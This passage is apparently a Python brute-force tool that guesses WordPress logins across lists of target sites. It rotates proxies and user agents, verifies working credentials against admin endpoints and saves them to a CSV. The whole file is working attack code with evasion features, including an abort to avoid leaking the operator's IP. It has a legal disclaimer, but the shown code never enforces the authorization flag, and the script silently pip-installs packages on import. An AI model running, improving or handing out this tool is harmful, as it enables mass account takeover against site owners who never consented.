#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wp_bruteforcer.py
=================

Fast, concurrent WordPress credential testing for **authorized** security
assessments, CTF ranges and lab environments.

⚠  LEGAL NOTICE
---------------
This tool performs credential guessing against WordPress login endpoints.
Running it against systems you do not own, or do not have **explicit written
permission** to test, is illegal in most jurisdictions and is a violation of
computer-misuse laws. The author assumes no liability for misuse.

You must pass ``--i-have-authorization`` for the tool to run at all.

Only non-destructive, read-only login attempts are performed.

v1.2.0
------
* Mandatory post-login verification against authenticated-only endpoints
  using the same session/cookie jar (fixes false positives from the earlier
  "cookie = success" logic).
* Session priming GET on ``/wp-login.php`` before the login POST so WordPress
  issues ``wordpress_test_cookie``. Without it, valid credentials were being
  rejected with a "Cookies are blocked" error (silent false negatives).
"""

from __future__ import annotations

# --------------------------------------------------------------------------- #
#  Standard library imports (safe: no third-party deps yet)
# --------------------------------------------------------------------------- #
import argparse
import asyncio
import csv
import importlib.util
import random
import re
import subprocess
import sys
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Deque, Dict, Iterator, List, Optional, Set, Tuple
from urllib.parse import urlparse, urlunparse

PROG = "wp_bruteforcer.py"
VERSION = "1.2.0"

# --------------------------------------------------------------------------- #
#  Automatic dependency installation
# --------------------------------------------------------------------------- #

_REQUIRED = {
    "aiohttp": "aiohttp",
    "aiohttp_socks": "aiohttp_socks",
    "rich": "rich",
}
_OPTIONAL = {
    "tqdm": "tqdm",
    "orjson": "orjson",
}


def _module_available(name: str) -> bool:
    """Return True if *name* can be imported without actually importing it."""
    try:
        return importlib.util.find_spec(name) is not None
    except (ImportError, ValueError):
        return False


def _pip_install(packages: List[str]) -> None:
    """Install *packages* using the interpreter running this script."""
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", *packages]
    )


def bootstrap_dependencies() -> None:
    """Install any missing required/optional packages before importing them."""
    missing = [pkg for mod, pkg in _REQUIRED.items() if not _module_available(mod)]
    if missing:
        print(f"[*] Installing required packages: {', '.join(missing)}", flush=True)
        try:
            _pip_install(missing)
        except subprocess.CalledProcessError as exc:  # pragma: no cover
            print(f"[!] pip install failed ({exc}). Install manually and re-run.", file=sys.stderr)
            sys.exit(1)

    for mod, pkg in _OPTIONAL.items():
        if not _module_available(mod):
            try:
                _pip_install([pkg])
            except Exception:
                pass

    if sys.platform != "win32" and not _module_available("uvloop"):
        try:
            _pip_install(["uvloop"])
        except Exception:
            pass


bootstrap_dependencies()

# --------------------------------------------------------------------------- #
#  Third-party imports (guaranteed to exist after bootstrap)
# --------------------------------------------------------------------------- #
import aiohttp  # noqa: E402
from aiohttp_socks import ProxyConnector  # noqa: E402
from rich import box  # noqa: E402
from rich.align import Align  # noqa: E402
from rich.console import Console, Group  # noqa: E402
from rich.live import Live  # noqa: E402
from rich.panel import Panel  # noqa: E402
from rich.table import Table  # noqa: E402
from rich.text import Text  # noqa: E402

try:  # optional accelerator
    import orjson as _orjson  # type: ignore
except Exception:  # pragma: no cover
    _orjson = None


# --------------------------------------------------------------------------- #
#  Constants
# --------------------------------------------------------------------------- #

DEFAULT_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

SOCKS_SCHEMES = ("socks4://", "socks4a://", "socks5://", "socks5h://")
HTTP_SCHEMES = ("http://", "https://")

PROXY_CHECK_INTERVAL = 300.0   # seconds between proxy validation sweeps
PROXY_DEAD_THRESHOLD = 5       # consecutive failures before a proxy is retired

# Cookie prefixes issued by WordPress for authenticated sessions.
WP_LOGIN_COOKIES = ("wordpress_logged_in_", "wordpress_sec_")

# Cookie WordPress requires on the login POST; without it the request is
# rejected with "Cookies are blocked" even when the credentials are correct.
WP_TEST_COOKIE = "wordpress_test_cookie"
WP_TEST_COOKIE_VALUE = "WP+Cookie+check"


# --------------------------------------------------------------------------- #
#  Small helpers
# --------------------------------------------------------------------------- #

def format_duration(seconds: float) -> str:
    """Human readable duration."""
    total = int(max(0.0, seconds))
    hours, rem = divmod(total, 3600)
    minutes, secs = divmod(rem, 60)
    if hours:
        return f"{hours}h{minutes:02d}m{secs:02d}s"
    if minutes:
        return f"{minutes}m{secs:02d}s"
    return f"{secs}s"


def iter_lines(path: Path, strip: bool = True) -> Iterator[str]:
    """Yield non-empty, non-comment lines from *path* without loading it fully."""
    with open(path, "r", encoding="utf-8", errors="replace") as handle:
        for raw in handle:
            line = raw.strip() if strip else raw.rstrip("\r\n")
            if not line or line.startswith("#"):
                continue
            yield line


def count_entries(path: Path, strip: bool = True) -> int:
    """Count the usable lines in a file (cheap streaming pass)."""
    total = 0
    try:
        for _ in iter_lines(path, strip=strip):
            total += 1
    except OSError:
        return 0
    return total


def normalize_target(raw: str) -> Optional[str]:
    """Normalise a target string into a scheme-qualified base URL."""
    value = raw.strip()
    if not value:
        return None
    if not re.match(r"^https?://", value, re.IGNORECASE):
        value = "https://" + value
    try:
        parsed = urlparse(value)
    except ValueError:
        return None
    if not parsed.netloc:
        return None
    scheme = parsed.scheme.lower()
    netloc = parsed.netloc
    path = parsed.path.rstrip("/")
    return urlunparse((scheme, netloc, path, "", "", ""))


def normalize_proxy(raw: str) -> Optional[str]:
    """Normalise a proxy string, defaulting to http:// when scheme-less."""
    value = raw.strip()
    if not value:
        return None
    if "://" not in value:
        value = "http://" + value
    scheme = value.split("://", 1)[0].lower() + "://"
    if scheme not in HTTP_SCHEMES + SOCKS_SCHEMES:
        return None
    return value


def is_socks(proxy: Optional[str]) -> bool:
    return bool(proxy) and proxy.lower().startswith(SOCKS_SCHEMES)


def jar_cookie_names(session: aiohttp.ClientSession) -> List[str]:
    """Return every cookie name currently held in a session's cookie jar."""
    names: List[str] = []
    try:
        for morsel in session.cookie_jar:  # type: ignore[attr-defined]
            names.append(morsel.key)
    except Exception:
        pass
    return names


# --------------------------------------------------------------------------- #
#  Configuration / data containers
# --------------------------------------------------------------------------- #

@dataclass
class Config:
    """Runtime configuration derived from the command line."""
    targets: Path
    usernames: Path
    passwords: Path
    proxies: Optional[Path]
    no_proxy: bool
    threads: int
    per_host: int
    timeout: float
    retries: int
    delay: float
    output: Path
    error_log: Optional[Path]
    stop_on_success: bool
    user_agent: Optional[str]
    verbose: bool
    no_color: bool
    check_wp: bool


@dataclass
class Stats:
    """Mutable counters used by the live dashboard."""
    targets_total: int = 0
    targets_done: int = 0
    targets_skipped: int = 0
    attempts: int = 0
    successes: int = 0
    rejected: int = 0
    errors: int = 0
    timeouts: int = 0
    proxy_errors: int = 0
    start_time: float = field(default_factory=time.time)


@dataclass
class ResponseData:
    """A minimal, decoded HTTP response."""
    status: int
    url: str
    headers: Dict[str, str]
    cookie_names: List[str]
    body: str


@dataclass
class TargetState:
    """Per-target bookkeeping."""
    target: str
    found: bool = False


# --------------------------------------------------------------------------- #
#  Rate limiting
# --------------------------------------------------------------------------- #

class RateLimiter:
    """Per-host pacing with jitter. Enforces a minimum interval between starts."""

    def __init__(self, delay: float) -> None:
        self.delay = max(0.0, delay)
        self._next_allowed = 0.0
        self._lock = asyncio.Lock()

    async def wait(self) -> None:
        if self.delay <= 0:
            return
        async with self._lock:
            now = time.monotonic()
            sleep_for = max(0.0, self._next_allowed - now)
            base = max(now, self._next_allowed)
            self._next_allowed = base + self.delay + random.uniform(0.0, self.delay * 0.5)
        if sleep_for > 0:
            await asyncio.sleep(sleep_for)


# --------------------------------------------------------------------------- #
#  Proxy pool
# --------------------------------------------------------------------------- #

class ProxyPool:
    """Round-robin proxy rotation with passive and active health tracking."""

    def __init__(self, proxies: List[str]) -> None:
        self._proxies: List[str] = list(dict.fromkeys(proxies))
        self._dead: Set[str] = set()
        self._failures: Dict[str, int] = {}
        self._index = 0

    def __len__(self) -> int:
        return len(self._proxies)

    @property
    def total(self) -> int:
        return len(self._proxies)

    @property
    def dead_count(self) -> int:
        return len(self._dead)

    @property
    def alive_count(self) -> int:
        return len(self._proxies) - len(self._dead)

    def alive(self) -> List[str]:
        return [p for p in self._proxies if p not in self._dead]

    def next(self) -> Optional[str]:
        """Return the next live proxy in round-robin order (or None)."""
        if not self._proxies:
            return None
        count = len(self._proxies)
        for _ in range(count):
            candidate = self._proxies[self._index % count]
            self._index = (self._index + 1) % count
            if candidate not in self._dead:
                return candidate
        return None

    def report_success(self, proxy: Optional[str]) -> None:
        if proxy:
            self._failures[proxy] = 0

    def report_failure(self, proxy: Optional[str], weight: int = 1) -> None:
        if not proxy:
            return
        self._failures[proxy] = self._failures.get(proxy, 0) + weight
        if self._failures[proxy] >= PROXY_DEAD_THRESHOLD:
            self._dead.add(proxy)

    def mark_dead(self, proxy: str) -> None:
        self._dead.add(proxy)


# --------------------------------------------------------------------------- #
#  Connector pool (keeps TCP pooling while allowing per-attempt cookie jars)
# --------------------------------------------------------------------------- #

class ConnectorPool:
    """Caches one aiohttp connector per proxy 'kind' so connections are reused."""

    def __init__(self, limit: int, limit_per_host: int) -> None:
        self._limit = max(1, limit)
        self._limit_per_host = max(1, limit_per_host)
        self._connectors: Dict[str, aiohttp.BaseConnector] = {}

    @staticmethod
    def _key(proxy: Optional[str]) -> str:
        return proxy if is_socks(proxy) else "__direct__"

    def get(self, proxy: Optional[str]) -> aiohttp.BaseConnector:
        key = self._key(proxy)
        connector = self._connectors.get(key)
        if connector is None:
            if key == "__direct__":
                connector = aiohttp.TCPConnector(
                    limit=self._limit,
                    limit_per_host=self._limit_per_host,
                    ttl_dns_cache=300,
                    enable_cleanup_closed=True,
                )
            else:
                connector = ProxyConnector.from_url(
                    key,
                    limit=self._limit,
                    limit_per_host=self._limit_per_host,
                    rdns=True,
                )
            self._connectors[key] = connector
        return connector

    async def close(self) -> None:
        for connector in list(self._connectors.values()):
            try:
                await connector.close()
            except Exception:
                pass
        self._connectors.clear()


# --------------------------------------------------------------------------- #
#  Result writer
# --------------------------------------------------------------------------- #

class ResultWriter:
    """Append-only CSV writer for confirmed credentials."""

    HEADER = ["target", "username", "password", "proxy", "timestamp", "evidence"]

    def __init__(self, path: Path) -> None:
        self.path = path
        self._handle = None
        self._writer = None

    def open(self) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        is_new = not self.path.exists() or self.path.stat().st_size == 0
        self._handle = open(self.path, "a", newline="", encoding="utf-8")
        self._writer = csv.writer(self._handle)
        if is_new:
            self._writer.writerow(self.HEADER)
            self._handle.flush()

    def write(self, row: List[str]) -> None:
        if self._writer is None:
            return
        self._writer.writerow(row)
        self._handle.flush()

    def close(self) -> None:
        if self._handle is not None:
            try:
                self._handle.close()
            finally:
                self._handle = None
                self._writer = None


class ErrorLog:
    """Optional append-only plain-text error log."""

    def __init__(self, path: Optional[Path]) -> None:
        self.path = path
        self._handle = None

    def open(self) -> None:
        if self.path is None:
            return
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._handle = open(self.path, "a", encoding="utf-8")

    def write(self, message: str) -> None:
        if self._handle is None:
            return
        stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
        self._handle.write(f"{stamp} {message}\n")
        self._handle.flush()

    def close(self) -> None:
        if self._handle is not None:
            try:
                self._handle.close()
            finally:
                self._handle = None


# --------------------------------------------------------------------------- #
#  Terminal UI
# --------------------------------------------------------------------------- #

_LEVEL_STYLES = {
    "info": "cyan",
    "success": "bold green",
    "warn": "bold yellow",
    "error": "bold red",
    "debug": "dim",
}


class UI:
    """Rich-powered live dashboard plus colour-coded status output."""

    def __init__(self, console: Console, live_enabled: bool = True) -> None:
        self.console = console
        self.live_enabled = live_enabled
        self._live: Optional[Live] = None
        self._recent: Deque[List[str]] = deque(maxlen=6)
        self._messages: Deque[Text] = deque(maxlen=6)

    # -- lifecycle --------------------------------------------------------- #

    def start(self) -> None:
        if not self.live_enabled:
            return
        self._live = Live(
            self._render(),
            console=self.console,
            refresh_per_second=8,
            transient=False,
            vertical_overflow="visible",
        )
        self._live.start()

    def stop(self) -> None:
        if self._live is not None:
            try:
                self._live.update(self._render())
                self._live.stop()
            except Exception:
                pass
            self._live = None

    # -- logging ----------------------------------------------------------- #

    def log(self, level: str, message: str, console: bool = True) -> None:
        """Record a status line, optionally echoing it to the scrollback."""
        style = _LEVEL_STYLES.get(level, "white")
        text = Text()
        text.append(f"[{level.upper():<7}] ", style=style)
        text.append(message, style="white")
        self._messages.append(text)
        if console and (self._live is None or level in ("success", "warn", "error")):
            self.console.print(text)

    def add_result(self, row: List[str]) -> None:
        self._recent.append(row)

    # -- rendering --------------------------------------------------------- #

    def refresh(self, stats: Stats, pool: ProxyPool, total_targets: int) -> None:
        if self._live is not None:
            self._live.update(self._render(stats, pool, total_targets))

    def _render(
        self,
        stats: Optional[Stats] = None,
        pool: Optional[ProxyPool] = None,
        total_targets: int = 0,
    ):
        stats = stats or Stats()
        elapsed = max(0.001, time.time() - stats.start_time)
        rate = stats.attempts / elapsed

        header = Panel(
            Align.center(
                Text.assemble(
                    ("WP-BruteForcer ", "bold cyan"),
                    (f"v{VERSION}", "dim"),
                )
            ),
            border_style="cyan",
            padding=(0, 1),
        )

        grid = Table.grid(expand=True, padding=(0, 2))
        for _ in range(4):
            grid.add_column(justify="left", ratio=1)
        grid.add_row(
            Text.assemble(("Targets  ", "bold cyan"), (f"{stats.targets_done}/{total_targets}", "white")),
            Text.assemble(("Attempts ", "bold cyan"), (f"{stats.attempts:,}", "white")),
            Text.assemble(("Hits     ", "bold green"), (f"{stats.successes:,}", "bold green")),
            Text.assemble(("Rejected ", "bold yellow"), (f"{stats.rejected:,}", "white")),
        )
        proxy_text = (
            f"{pool.alive_count} alive / {pool.dead_count} dead"
            if pool is not None and pool.total
            else "direct"
        )
        grid.add_row(
            Text.assemble(("Rate     ", "bold cyan"), (f"{rate:,.1f}/s", "white")),
            Text.assemble(("Elapsed  ", "bold cyan"), (format_duration(elapsed), "white")),
            Text.assemble(("Skipped  ", "bold yellow"), (f"{stats.targets_skipped:,}", "white")),
            Text.assemble(("Proxies  ", "bold magenta"), (proxy_text, "white")),
        )

        results = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        results.add_column("Target", style="cyan", overflow="fold")
        results.add_column("Username", style="yellow", no_wrap=True)
        results.add_column("Password", style="yellow", no_wrap=True)
        results.add_column("Evidence", style="green", overflow="fold")
        if self._recent:
            for row in list(self._recent)[-4:]:
                results.add_row(*row[:4])
        else:
            results.add_row("[dim]—[/dim]", "[dim]—[/dim]", "[dim]—[/dim]", "[dim]no hits yet[/dim]")

        log_panel = Panel(
            Group(*self._messages) if self._messages else Text("idle", style="dim"),
            title="[bold]activity[/bold]",
            border_style="grey37",
            padding=(0, 1),
        )

        return Group(header, grid, results, log_panel)


# --------------------------------------------------------------------------- #
#  Success evaluation (candidate-only; verification happens separately)
# --------------------------------------------------------------------------- #

def evaluate_success(response: ResponseData) -> Tuple[bool, str]:
    """
    Cheap first-pass filter for a *possible* success.

    A ``True`` result is a **candidate only** and MUST be followed by
    ``Runner._verify_login()`` — cookie presence alone is not accepted as
    proof of authentication.
    """
    body = response.body.lower()
    final = response.url.lower()

    # Hard negative: explicit login error, or we are still sitting on the
    # login page.
    if "login_error" in body or "wp-login.php" in final:
        return False, ""

    # Candidate: WordPress appears to have issued an auth cookie.
    for name in response.cookie_names:
        if name.startswith(WP_LOGIN_COOKIES):
            return True, f"candidate-cookie:{name}"

    # Candidate: redirect landed somewhere other than the login page.
    if "wp-admin" in final:
        return True, f"candidate-redirect:{response.url}"

    return False, ""


# --------------------------------------------------------------------------- #
#  Core runner
# --------------------------------------------------------------------------- #

class Runner:
    """Owns the queues, worker pool, HTTP engine and output pipeline."""

    def __init__(self, cfg: Config, console: Console) -> None:
        self.cfg = cfg
        self.console = console
        self.ui = UI(console, live_enabled=True)

        self.stats = Stats()
        self.connectors = ConnectorPool(limit=cfg.threads, limit_per_host=cfg.per_host)
        self.proxy_pool = ProxyPool(self._load_proxies())
        self.writer = ResultWriter(cfg.output)
        self.error_log = ErrorLog(cfg.error_log)

        self._stop = asyncio.Event()
        self._result_lock = asyncio.Lock()
        self._limiters: Dict[str, RateLimiter] = {}
        self._proxy_warned = False
        self._targets_total = 0
        self._first_target: Optional[str] = None

        self._global_sem = asyncio.Semaphore(max(1, cfg.threads))
        self._target_workers = max(1, min(200, cfg.threads // max(1, cfg.per_host)))

        self.usernames: List[str] = []

    # -- setup helpers ----------------------------------------------------- #

    def _load_proxies(self) -> List[str]:
        if self.cfg.no_proxy or self.cfg.proxies is None:
            return []
        if not self.cfg.proxies.is_file():
            return []
        proxies: List[str] = []
        for raw in iter_lines(self.cfg.proxies):
            normalised = normalize_proxy(raw)
            if normalised:
                proxies.append(normalised)
        return proxies

    def _new_session(self, connector: aiohttp.BaseConnector) -> aiohttp.ClientSession:
        user_agent = self.cfg.user_agent or random.choice(DEFAULT_USER_AGENTS)
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        return aiohttp.ClientSession(
            connector=connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(unsafe=True),
            headers=headers,
            timeout=aiohttp.ClientTimeout(
                total=self.cfg.timeout, connect=min(self.cfg.timeout, 10.0)
            ),
            trust_env=False,
            auto_decompress=True,
        )

    def _limiter_for(self, target: str) -> RateLimiter:
        host = urlparse(target).netloc.lower()
        limiter = self._limiters.get(host)
        if limiter is None:
            limiter = RateLimiter(self.cfg.delay)
            self._limiters[host] = limiter
        return limiter

    def _pick_proxy(self) -> Optional[str]:
        if self.cfg.no_proxy or self.proxy_pool.total == 0:
            return None
        proxy = self.proxy_pool.next()
        if proxy is None and self.proxy_pool.alive_count == 0 and not self._proxy_warned:
            self._proxy_warned = True
            self.ui.log(
                "error",
                "All proxies are dead — aborting to avoid leaking your real IP.",
            )
            self._stop.set()
        return proxy

    # -- credential streaming ---------------------------------------------- #

    def _credential_pairs(self) -> Iterator[Tuple[str, str]]:
        """Stream the username × password cartesian product (passwords re-streamed)."""
        for username in self.usernames:
            for password in iter_lines(self.cfg.passwords, strip=False):
                yield username, password

    # -- HTTP --------------------------------------------------------------- #

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        *,
        proxy: Optional[str] = None,
        retries: Optional[int] = None,
        **kwargs: Any,
    ) -> ResponseData:
        """Perform an HTTP request with exponential-backoff retries."""
        attempts = self.cfg.retries if retries is None else retries
        proxy_arg = proxy if (proxy and proxy.lower().startswith(HTTP_SCHEMES)) else None
        last_error: Optional[BaseException] = None

        for attempt in range(attempts + 1):
            try:
                async with session.request(
                    method,
                    url,
                    proxy=proxy_arg,
                    ssl=False,
                    allow_redirects=True,
                    **kwargs,
                ) as response:
                    body = await response.text(errors="replace")
                    return ResponseData(
                        status=response.status,
                        url=str(response.url),
                        headers=dict(response.headers),
                        cookie_names=list(response.cookies.keys()),
                        body=body,
                    )
            except asyncio.CancelledError:
                raise
            except Exception as exc:  # noqa: BLE001 - deliberate broad catch
                last_error = exc
                if attempt >= attempts:
                    break
                await asyncio.sleep(min(2 ** attempt, 8) * (0.5 + random.random()))

        raise last_error if last_error is not None else RuntimeError("request failed")

    # -- error accounting ---------------------------------------------------- #

    _PROXY_EXC_NAMES = {
        "ProxyError",
        "ProxyConnectionError",
        "ProxyTimeoutError",
        "ProxyServerError",
        "ClientProxyConnectionError",
        "SocksError",
        "SocksConnectionError",
        "SocksConnectionTimeoutError",
    }

    def _log_net_error(self, exc: BaseException, target: str, proxy: Optional[str]) -> None:
        if isinstance(exc, asyncio.TimeoutError):
            self.stats.timeouts += 1
        else:
            self.stats.errors += 1

        message = f"{type(exc).__name__}: {exc}"
        lowered = str(exc).lower()
        proxy_related = bool(proxy) and (
            type(exc).__name__ in self._PROXY_EXC_NAMES or "proxy" in lowered
        )
        if proxy_related:
            self.stats.proxy_errors += 1
            self.proxy_pool.report_failure(proxy)

        self.ui.log("error", f"{target} :: {message[:150]}", console=self.cfg.verbose)
        self.error_log.write(f"target={target} proxy={proxy or '-'} error={message}")

    # -- WordPress detection -------------------------------------------------- #

    async def _is_wordpress(
        self, session: aiohttp.ClientSession, target: str, proxy: Optional[str]
    ) -> bool:
        base = target.rstrip("/")

        try:
            resp = await self._request(session, "GET", f"{base}/wp-login.php", proxy=proxy, retries=0)
            body = resp.body.lower()
            if resp.status == 200 and ("user_login" in body or "wp-submit" in body or "wordpress" in body):
                return True
        except Exception:
            pass

        try:
            resp = await self._request(session, "GET", f"{base}/wp-json/", proxy=proxy, retries=0)
            if resp.status == 200 and ("wp/v2" in resp.body or "namespaces" in resp.body):
                return True
        except Exception:
            pass

        try:
            resp = await self._request(session, "GET", base + "/", proxy=proxy, retries=0)
            body = resp.body.lower()
            if "wp-content" in body or 'name="generator" content="wordpress' in body:
                return True
        except Exception:
            pass

        return False

    # -- login verification (mandatory for every candidate hit) -------------- #

    async def _verify_login(
        self,
        session: aiohttp.ClientSession,
        target: str,
        proxy: Optional[str],
    ) -> Tuple[bool, str]:
        """
        Confirm a candidate login by probing authenticated-only endpoints using
        the SAME session (so the cookie jar is preserved).

        Cookie presence alone is NOT accepted. At least one *strong* signal is
        required: an authenticated-only page that does not bounce back to
        ``wp-login.php`` and that contains genuine admin UI markers, or a
        REST ``/users/me`` response containing a user object.
        """
        base = target.rstrip("/")

        # --- Precondition: the auth cookie must still be in our jar --------
        jar_names = jar_cookie_names(session)
        if not any(n.startswith(WP_LOGIN_COOKIES) for n in jar_names):
            # No cookie at all → still check the endpoints; some hosts set the
            # cookie via a redirect that the jar may have partially swallowed.
            pass

        # --- Probe 1: /wp-admin/profile.php (always forces authentication) --
        try:
            resp = await self._request(
                session, "GET", f"{base}/wp-admin/profile.php",
                proxy=proxy, retries=0,
            )
            final = resp.url.lower()
            body = resp.body.lower()

            if "wp-login.php" in final:
                return False, "verify:profile-bounced-to-login"
            if 'name="log"' in body and 'name="pwd"' in body:
                return False, "verify:profile-shows-login-form"
            if (
                "wpadminbar" in body
                or "adminmenu" in body
                or "wp-admin-bar-my-account" in body
            ):
                return True, "verify:profile-admin-ui"
        except Exception:
            pass

        # --- Probe 2: /wp-admin/ dashboard ---------------------------------
        try:
            resp = await self._request(
                session, "GET", f"{base}/wp-admin/",
                proxy=proxy, retries=0,
            )
            final = resp.url.lower()
            body = resp.body.lower()

            if "wp-login.php" in final:
                return False, "verify:admin-bounced-to-login"
            if 'name="log"' in body and 'name="pwd"' in body:
                return False, "verify:admin-shows-login-form"
            if "wpadminbar" in body and ("howdy" in body or "log out" in body):
                return True, "verify:dashboard-toolbar"
            if 'id="adminmenu"' in body or "id='adminmenu'" in body:
                return True, "verify:dashboard-menu"
            # Authenticated but lacking an admin role — still valid credentials.
            if "you do not have sufficient permissions" in body:
                return True, "verify:authenticated-non-admin"
        except Exception:
            pass

        # --- Probe 3: REST /users/me (returns a user only when logged in) --
        try:
            resp = await self._request(
                session, "GET", f"{base}/wp-json/wp/v2/users/me",
                proxy=proxy, retries=0,
            )
            if resp.status == 200 and '"id"' in resp.body and '"slug"' in resp.body:
                return True, "verify:rest-users-me"
        except Exception:
            pass

        return False, "verify:no-strong-signal"

    # -- login attempt --------------------------------------------------------- #

    async def _login_attempt(
        self,
        session: aiohttp.ClientSession,
        target: str,
        username: str,
        password: str,
        proxy: Optional[str],
        state: TargetState,
    ) -> None:
        await self._limiter_for(target).wait()

        base = target.rstrip("/")
        login_url = f"{base}/wp-login.php"

        # ------------------------------------------------------------------ #
        # Prime the session.
        #
        # WordPress's wp-login.php rejects the login POST with a
        # "Cookies are blocked" error — even when the username and password
        # are correct — unless the client already holds `wordpress_test_cookie`
        # in its cookie jar. The only reliable way to obtain it is a GET on
        # wp-login.php using the SAME session that will issue the POST.
        # ------------------------------------------------------------------ #
        try:
            await self._request(
                session, "GET", login_url, proxy=proxy, retries=0,
            )
        except Exception:
            # Continue anyway — the POST below will surface a clearer error
            # if the site is truly unreachable.
            pass

        payload = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{base}/wp-admin/",
            "testcookie": "1",
        }

        post_headers: Dict[str, str] = {"Referer": login_url, "Origin": base}

        # Belt-and-braces fallback: if the priming GET failed to set the test
        # cookie for any reason, send it explicitly. WordPress only checks
        # that the cookie exists, not its value.
        if WP_TEST_COOKIE not in jar_cookie_names(session):
            post_headers["Cookie"] = f"{WP_TEST_COOKIE}={WP_TEST_COOKIE_VALUE}"

        try:
            response = await self._request(
                session,
                "POST",
                login_url,
                proxy=proxy,
                data=payload,
                headers=post_headers,
            )
        except Exception as exc:  # noqa: BLE001
            self._log_net_error(exc, target, proxy)
            return

        self.stats.attempts += 1
        self.proxy_pool.report_success(proxy)

        # Merge cookies seen in the Set-Cookie header with the session jar.
        merged_cookie_names = sorted(
            set(response.cookie_names) | set(jar_cookie_names(session))
        )
        candidate_response = ResponseData(
            status=response.status,
            url=response.url,
            headers=response.headers,
            cookie_names=merged_cookie_names,
            body=response.body,
        )

        candidate, evidence = evaluate_success(candidate_response)
        if not candidate:
            return

        # ---- MANDATORY verification: hit authenticated-only endpoints -----
        try:
            verified, verify_evidence = await self._verify_login(session, target, proxy)
        except Exception as exc:
            verified, verify_evidence = False, f"verify-error:{type(exc).__name__}"

        if not verified:
            self.stats.rejected += 1
            self.ui.log(
                "debug",
                f"rejected false positive {target} {username}:{password} "
                f"({verify_evidence})",
                console=self.cfg.verbose,
            )
            return

        await self._record_success(
            target, username, password, proxy,
            f"{evidence}|{verify_evidence}",
            state,
        )

    async def _record_success(
        self,
        target: str,
        username: str,
        password: str,
        proxy: Optional[str],
        evidence: str,
        state: TargetState,
    ) -> None:
        async with self._result_lock:
            self.stats.successes += 1
            state.found = True
            stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
            row = [target, username, password, proxy or "direct", stamp, evidence]
            self.writer.write(row)
            self.ui.add_result([target, username, password, evidence])
            self.ui.log("success", f"{target}  →  {username}:{password}  ({evidence})")

    # -- attempt wrappers -------------------------------------------------------- #

    async def _attempt(
        self,
        target: str,
        username: str,
        password: str,
        state: TargetState,
    ) -> None:
        async with self._global_sem:
            if self._stop.is_set():
                return
            if state.found and self.cfg.stop_on_success:
                return
            proxy = self._pick_proxy()
            if self._stop.is_set():
                return
            connector = self.connectors.get(proxy)
            session = self._new_session(connector)
            try:
                await self._login_attempt(session, target, username, password, proxy, state)
            finally:
                try:
                    await session.close()
                except Exception:
                    pass

    async def _guarded_attempt(
        self,
        target: str,
        username: str,
        password: str,
        semaphore: asyncio.Semaphore,
        state: TargetState,
    ) -> None:
        try:
            if self._stop.is_set():
                return
            if state.found and self.cfg.stop_on_success:
                return
            await self._attempt(target, username, password, state)
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001
            self.stats.errors += 1
            self.ui.log(
                "error",
                f"{target} :: unexpected {type(exc).__name__}: {exc}",
                console=self.cfg.verbose,
            )
        finally:
            semaphore.release()

    # -- target processing -------------------------------------------------------- #

    async def _process_target(self, target: str) -> None:
        if self._stop.is_set():
            return
        state = TargetState(target=target)

        if self.cfg.check_wp:
            proxy = self._pick_proxy()
            session = self._new_session(self.connectors.get(proxy))
            try:
                is_wp = await self._is_wordpress(session, target, proxy)
            except Exception as exc:  # noqa: BLE001
                is_wp = False
                self._log_net_error(exc, target, proxy)
            finally:
                try:
                    await session.close()
                except Exception:
                    pass

            if not is_wp:
                self.stats.targets_skipped += 1
                self.stats.targets_done += 1
                self.ui.log("warn", f"skipping (not WordPress): {target}", console=self.cfg.verbose)
                return

        semaphore = asyncio.Semaphore(max(1, self.cfg.per_host))
        inflight: Set[asyncio.Task] = set()

        for username, password in self._credential_pairs():
            if self._stop.is_set():
                break
            if state.found and self.cfg.stop_on_success:
                break
            await semaphore.acquire()
            task = asyncio.create_task(
                self._guarded_attempt(target, username, password, semaphore, state)
            )
            inflight.add(task)
            task.add_done_callback(inflight.discard)

        if inflight:
            await asyncio.gather(*list(inflight), return_exceptions=True)

        self.stats.targets_done += 1

    # -- producer / consumers ------------------------------------------------------ #

    async def _producer(self, queue: asyncio.Queue) -> None:
        seen: Set[str] = set()
        for raw in iter_lines(self.cfg.targets):
            if self._stop.is_set():
                break
            target = normalize_target(raw)
            if not target or target in seen:
                continue
            seen.add(target)
            if self._first_target is None:
                self._first_target = target
            await queue.put(target)
        for _ in range(self._target_workers):
            await queue.put(None)

    async def _target_worker(self, queue: asyncio.Queue, index: int) -> None:
        while True:
            item = await queue.get()
            try:
                if item is None:
                    return
                await self._process_target(item)
            except asyncio.CancelledError:
                raise
            except Exception as exc:  # noqa: BLE001
                self.stats.errors += 1
                self.ui.log("error", f"worker[{index}] {type(exc).__name__}: {exc}")
            finally:
                queue.task_done()

    async def _proxy_validator(self) -> None:
        """Periodically re-check every live proxy against the first target."""
